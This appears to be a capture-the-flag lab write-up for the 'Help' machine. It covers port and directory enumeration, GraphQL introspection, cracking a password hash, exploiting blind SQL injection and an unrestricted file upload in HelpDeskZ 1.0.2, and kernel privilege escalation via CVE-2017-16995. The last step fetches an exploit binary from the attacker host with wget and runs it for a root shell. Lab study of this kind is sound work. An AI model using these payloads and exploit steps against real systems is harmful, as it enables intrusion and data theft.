## Help

### Lab Details 

- Difficulty: Easy
- Type: GraphQL, Web App, HelpDeskZ, Priv Esc,  Linux

#### Tasks
Q1: How many TCP ports are open on Help?
- run nmap `nmap -sT -T4 -vv -A -p- -Pn -oA Help 10.10.10.121`
```
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e5:bb:4d:9c:de:af:6b:bf:ba:8c:22:7a:d8:d7:43:28 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCZY4jlvWqpdi8bJPUnSkjWmz92KRwr2G6xCttorHM8Rq2eCEAe1ALqpgU44L3potYUZvaJuEIsBVUSPlsKv+ds8nS7Mva9e9ztlad/fzBlyBpkiYxty+peoIzn4lUNSadPLtYH6khzN2PwEJYtM/b6BLlAAY5mDsSF0Cz3wsPbnu87fNdd7WO0PKsqRtHpokjkJ22uYJoDSAM06D7uBuegMK/sWTVtrsDakb1Tb6H8+D0y6ZQoE7XyHSqD0OABV3ON39GzLBOnob4Gq8aegKBMa3hT/Xx9Iac6t5neiIABnG4UP03gm207oGIFHvlElGUR809Q9qCJ0nZsup4bNqa/
|   256 d5:b0:10:50:74:86:a3:9f:c5:53:6f:3b:4a:24:61:19 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHINVMyTivG0LmhaVZxiIESQuWxvN2jt87kYiuPY2jyaPBD4DEt8e/1kN/4GMWj1b3FE7e8nxCL4PF/lR9XjEis=
|   256 e2:1b:88:d3:76:21:d4:1e:38:15:4a:81:11:b7:99:07 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHxDPln3rCQj04xFAKyecXJaANrW3MBZJmbhtL4SuDYX
80/tcp   open  http    syn-ack Apache httpd 2.4.18
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://help.htb/
3000/tcp open  http    syn-ack Node.js Express framework
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (application/json; charset=utf-8).
```

Q2: What is the relative path to the Graph Query Language instance running on port 3000?
- tried perform web enum using ffuf however no luck 
```
$ ffuf -u http://help.htb:3000/FUZZ -w /usr/share/wordlists/dirb/big.txt 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://help.htb:3000/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

:: Progress: [20469/20469] :: Job [1/1] :: 147 req/sec :: Duration: [0:02:54] :: Errors: 0 ::
```
- referred to GraphQL doc and found that the usual endpoint is /graphql (https://graphql.org/learn/serving-over-http/)

Q3: The User data type has two fields - password and what?
- installed and utilized GraphQLmap to assist with the enum of endpoint 
```
$ graphqlmap -u http://help.htb:3000/graphql                              
  / ____|               | |    / __ \| |                           
 | |  __ _ __ __ _ _ __ | |__ | |  | | |     _ __ ___   __ _ _ __  
 | | |_ | '__/ _` | '_ \| '_ \| |  | | |    | '_ ` _ \ / _` | '_ \ 
 | |__| | | | (_| | |_) | | | | |__| | |____| | | | | | (_| | |_) |
  \_____|_|  \__,_| .__/|_| |_|\___\_\______|_| |_| |_|\__,_| .__/ 
                  | |                                       | |    
                  |_|                                       |_|    
                              Author: @pentest_swissky Version: 1.1 
GraphQLmap > help
[+] dump_via_introspection : dump GraphQL schema (fragment+FullType)
[+] dump_via_fragment      : dump GraphQL schema (IntrospectionQuery)
[+] nosqli      : exploit a nosql injection inside a GraphQL query
[+] postgresqli : exploit a sql injection inside a GraphQL query
[+] mysqli      : exploit a sql injection inside a GraphQL query
[+] mssqli      : exploit a sql injection inside a GraphQL query
[+] exit        : gracefully exit the application

GraphQLmap > dump_via_introspection
============= [SCHEMA] ===============
e.g: name[Type]: arg (Type!)

00: Query
        user[]: 
01: User
        username[]: 
        password[]: 
03: __Schema
04: __Type
07: __Field
08: __InputValue
09: __EnumValue
10: __Directive
```
Q4: What is the email address of the user in the GraphQL database?
- used postman to fetch the data
![[postman_query.png]]

Q5: What is helpme@helpme.com's password?
- check for hash using https://www.dcode.fr/sha1-hash
- plaintext: godhelpmeplz

Q6: What is the domain name that the service on port 80 redirects to when visited by IP address?
- help.htb refer to the output from nmap, show the domain name

Q7: What relative path on help.htb returns an instance of HelpDeskZ?
- run ffuf against target and found /support
```
$ ffuf -u http://help.htb/FUZZ -w /usr/share/wordlists/dirb/common.txt -fc 302 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://help.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 302
________________________________________________

                        [Status: 200, Size: 11321, Words: 3503, Lines: 376, Duration: 2876ms]
.htaccess               [Status: 403, Size: 292, Words: 22, Lines: 12, Duration: 3876ms]
.hta                    [Status: 403, Size: 287, Words: 22, Lines: 12, Duration: 3877ms]
.htpasswd               [Status: 403, Size: 292, Words: 22, Lines: 12, Duration: 8032ms]
index.html              [Status: 200, Size: 11321, Words: 3503, Lines: 376, Duration: 324ms]
javascript              [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 325ms]
server-status           [Status: 403, Size: 296, Words: 22, Lines: 12, Duration: 323ms]
support                 [Status: 301, Size: 306, Words: 20, Lines: 10, Duration: 322ms]
```

Q8: What version of HelpDeskZ is running on Help?
- on helpdeskz's github it states the version is 1.0.2 (2015)
- https://github.com/ViktorNova/HelpDeskZ

Q9: What is the username that we can get a shell as on help?
- there are two vulnerabilities that will allow us to gain a RCE to the target
- both requires a ticket with valid attachment to be raised at http://help.htb/support/?v=submit_ticket
1. SQLi
 - the vulnerability is located at getting the uploaded attachment of a ticket
 -  `GET /support/?v=view_tickets&action=ticket&param[]=4&param[]=attachment&param[]=1&param[]=6`
 - the last parameter is vulnerable to SQLi 
 - we can exploit this with SQLmap or a custom script 
 - ive tried different scripts from exploitdb as well as the official writeup, tried to tweak it however unable to get the password hash
```
$ sqlmap -r ticket_attechment.request --level 5 --risk 3 -p param[] -D support -T staff --dump
        ___
       __H__                                                                                                                                      
 ___ ___[.]_____ ___ ___  {1.9.2#stable}                                                                                                          
|_ -| . ["]     | .'| . |                                                                                                                         
|___|_  ["]_|_|_|__,|  _|                                                                                                                         
      |_|V...       |_|   https://sqlmap.org                                                                                                      

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 06:55:42 /2025-06-10/

[06:55:42] [INFO] parsing HTTP request from 'ticket_attechment.request'
[06:55:42] [INFO] resuming back-end DBMS 'mysql' 
[06:55:42] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: param[] (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: v=view_tickets&action=ticket&param[]=9&param[]=attachment&param[]=2&param[]=11 AND 8361=8361

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: v=view_tickets&action=ticket&param[]=9&param[]=attachment&param[]=2&param[]=11 AND (SELECT 5441 FROM (SELECT(SLEEP(5)))KFaR)
---
[06:55:44] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 16.04 or 16.10 (xenial or yakkety)
web application technology: Apache 2.4.18
back-end DBMS: MySQL >= 5.0.12
[06:55:44] [INFO] fetching columns for table 'staff' in database 'support'
[06:55:44] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[06:55:44] [INFO] retrieved: 14
[06:55:50] [INFO] retrieved: id
[06:56:02] [INFO] retrieved: username
[06:56:44] [INFO] retrieved: password
[06:57:36] [INFO] retrieved: fullname
[06:58:36] [INFO] retrieved: email
[06:59:11] [INFO] retrieved: login
[06:59:54] [INFO] retrieved: last_login
[07:01:20] [INFO] retrieved: department
[07:02:37] [INFO] retrieved: timezone
[07:03:39] [INFO] retrieved: signature
[07:04:44] [INFO] retrieved: newticket_notification
[07:07:34] [INFO] retrieved: avatar
[07:08:14] [INFO] retrieved: admin
[07:08:50] [INFO] retrieved: status
[07:09:35] [INFO] fetching entries for table 'staff' in database 'support'
[07:09:35] [INFO] fetching number of entries for table 'staff' in database 'support'
[07:09:35] [INFO] retrieved: 1
[07:09:39] [INFO] retrieved: 1
[07:09:46] [INFO] retrieved: Enable
[07:10:28] [INFO] retrieved:  
[07:10:42] [INFO] retrieved: a:1:{i:0;s:1:"1";}
[07:13:04] [INFO] retrieved: support@mysite.com
[07:15:33] [INFO] retrieved: Administrator
[07:17:04] [INFO] retrieved: 1
[07:17:11] [INFO] retrieved: 1543429746
[07:18:32] [INFO] retrieved: 1547216217
[07:19:43] [INFO] retrieved: 0
[07:19:54] [INFO] retrieved: d318f44739dced66793b1a603028133a76ae680e
[07:25:21] [INFO] retrieved: Best regards,  Administrator
[07:28:48] [INFO] retrieved: 
[07:28:49] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)          
[07:29:52] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 

[07:29:55] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
[07:29:55] [INFO] retrieved: admin
[07:30:31] [INFO] recognized possible password hashes in column 'password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
[07:30:37] [INFO] writing hashes to a temporary file '/tmp/sqlmap8vttgx9w281056/sqlmaphashes-wql228qo.txt' 
do you want to crack them via a dictionary-based attack? [Y/n/q] n
Database: support
Table: staff
[1 entry]
+----+--------------------+------------+--------+---------+----------+---------------+------------------------------------------+----------+----------+--------------------------------+--------------------+------------+------------------------+
| id | email              | login      | avatar | admin   | status   | fullname      | password                                 | timezone | username | signature                      | department         | last_login | newticket_notification |
+----+--------------------+------------+--------+---------+----------+---------------+------------------------------------------+----------+----------+--------------------------------+--------------------+------------+------------------------+
| 1  | support@mysite.com | 1547216217 | NULL   | 1       | Enable   | Administrator | d318f44739dced66793b1a603028133a76ae680e | <blank>  | admin    | Best regards,\r\nAdministrator | a:1:{i:0;s:1:"1";} | 1543429746 | 0                      |
+----+--------------------+------------+--------+---------+----------+---------------+------------------------------------------+----------+----------+--------------------------------+--------------------+------------+------------------------+
<snip>


```

2. File upload  
 - according to the controller page for "submit a ticket" page on github (https://github.com/ViktorNova/HelpDeskZ/blob/master/controllers/submit_ticket_controller.php)
 - any file can be uploaded as attachments, if file type does not match mere a error message displays no further actions will be applied to the uploaded file 
- which means that a webshell can be uploaded and used to perform RCE
- the filename is hashed with date and time, it is uploaded to http://help.htb/support/uploads/ticket/
- we can use bruteforce to find the webshell
```
$uploaddir = UPLOAD_DIR.'tickets/';		
					if($_FILES['attachment']['error'] == 0){
						$ext = pathinfo($_FILES['attachment']['name'], PATHINFO_EXTENSION);
						$filename = md5($_FILES['attachment']['name'].time()).".".$ext;
						$fileuploaded[] = array('name' => $_FILES['attachment']['name'], 'enc' => $filename, 'size' => formatBytes($_FILES['attachment']['size']), 'filetype' => $_FILES['attachment']['type']);
						$uploadedfile = $uploaddir.$filename;
						if (!move_uploaded_file($_FILES['attachment']['tmp_name'], $uploadedfile)) {
							$show_step2 = true;
							$error_msg = $LANG['ERROR_UPLOADING_A_FILE'];
						}else{
							$fileverification = verifyAttachment($_FILES['attachment']);
							switch($fileverification['msg_code']){
								case '1':
								$show_step2 = true;
								$error_msg = $LANG['INVALID_FILE_EXTENSION'];
								break;
								case '2':
								$show_step2 = true;
								$error_msg = $LANG['FILE_NOT_ALLOWED'];
								break;
								case '3':
								$show_step2 = true;
								$error_msg = str_replace('%size%',$fileverification['msg_extra'],$LANG['FILE_IS_BIG']);
								break;
							}
						}
					}	
				}
```
- if chosen SQLi then the username is help 
```
$ ssh help@10.10.10.121
help@10.10.10.121's password: 
Permission denied, please try again.
help@10.10.10.121's password: 
Welcome to Ubuntu 16.04.5 LTS (GNU/Linux 4.4.0-116-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
You have new mail.
Last login: Fri Jan 11 06:18:50 2019
help@help:~$ whoami
help
```


Q11: What is the kernel version on Help (ending in a word ending in "ic")?
- run uname to find kernel version
```
help@help:~$ uname -a
Linux help 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
```

Q12: Submit the flag located on the administrator's desktop.
- we can find the CVE for this kernel version which is CVE-2017-16995
- POC and complied binary is at https://github.com/anoaghost/Localroot_Compile/blob/master/2017/CVE-2017-16995/pwned- transfer the binary across to target and run to escalate access to root
```
help@help:~$ wget http://10.10.14.35:8000/pwned
--2025-06-10 04:40:47--  http://10.10.14.35:8000/pwned
Connecting to 10.10.14.35:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 14040 (14K) [application/octet-stream]
Saving to: ‘pwned’

pwned                        100%[==============================================>]  13.71K  44.8KB/s    in 0.3s    

2025-06-10 04:40:48 (44.8 KB/s) - ‘pwned’ saved [14040/14040]

help@help:~$ ls
help  npm-debug.log  pwned  user.txt
help@help:~$ ./pwned
-bash: ./pwned: Permission denied
help@help:~$ ls
help  npm-debug.log  pwned  user.txt
help@help:~$ ls -la
total 76
drwxr-xr-x   7 help help  4096 Jun 10 04:40 .
drwxr-xr-x   3 root root  4096 Dec 13  2023 ..
lrwxrwxrwx   1 root root     9 Dec 18  2023 .bash_history -> /dev/null
-rw-r--r--   1 help help   220 Nov 27  2018 .bash_logout
-rw-r--r--   1 help help     1 Nov 27  2018 .bash_profile
-rw-r--r--   1 help help  3771 Nov 27  2018 .bashrc
drwx------   2 help help  4096 Nov 23  2021 .cache
drwxr-xr-x   4 help help  4096 Dec 13  2023 .forever
drwxrwxrwx   6 help help  4096 May  4  2022 help
drwxrwxr-x   2 help help  4096 Nov 23  2021 .nano
drwxrwxr-x 290 help help 12288 Dec 13  2023 .npm
-rw-rw-r--   1 help help     1 May  4  2022 npm-debug.log
-rw-r--r--   1 help help   655 Nov 27  2018 .profile
-rw-rw-r--   1 help help 14040 Jun 10 04:40 pwned
-rw-r--r--   1 help help    33 Jun 10 03:46 user.txt
help@help:~$ chmod +x pwned
help@help:~$ ./pwned 
task_struct = ffff88003e2f4600
uidptr = ffff880037221f04
spawning root shell
```





#### Resources
- graphQL doc: https://graphql.org/learn/serving-over-http/
```
API endpoint
HTTP is commonly associated with REST, which uses “resources” as its core concept. In contrast, GraphQL’s conceptual model is an entity graph. As a result, entities in GraphQL are not identified by URLs. Instead, a GraphQL server operates on a single URL/endpoint, usually /graphql, and all GraphQL requests for a given service should be directed to this endpoint.
```

-helpdeskz github: https://github.com/ViktorNova/HelpDeskZ

- GraphQLmap: https://github.com/swisskyrepo/GraphQLmap

- unhash password use: https://www.dcode.fr/sha1-hash

- binary for kernel exploit: https://github.com/anoaghost/Localroot_Compile/blob/master/2017/CVE-2017-16995/pwned

#### Lesson Learned
- Check if target web app has github repo, if so check for funcationalities to identity vulnerabilities
